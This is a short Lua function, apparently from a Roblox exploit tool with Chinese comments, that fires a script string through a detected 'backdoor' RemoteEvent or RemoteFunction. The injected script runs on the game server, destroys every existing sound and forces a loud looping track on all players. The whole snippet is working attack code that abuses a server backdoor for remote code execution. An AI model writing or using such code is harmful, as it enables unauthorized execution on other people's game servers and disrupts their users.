-- 音乐播放函数
local function executeMusicScript(soundId, playbackSpeed)
    if not attached or not backdoor then
        notify("❌ 请先检测后门！")
        return
    end
    
    local musicScript = string.format([[
        -- 停止所有现有音乐
        for _, sound in pairs(game.Workspace:GetChildren()) do
            if sound:IsA("Sound") then
                sound:Stop()
                sound:Destroy()
            end
        end

        -- 播放新音乐
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://%s"
        sound.PlaybackSpeed = %s
        sound.Volume = 10
        sound.Looped = true
        sound.Parent = game.Workspace
        sound:Play()
        
        -- 确保音乐循环播放
        sound.Ended:Connect(function()
            sound:Play()
        end)
    ]], soundId, tostring(playbackSpeed))
    
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer(musicScript)
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer(musicScript)
    end
end

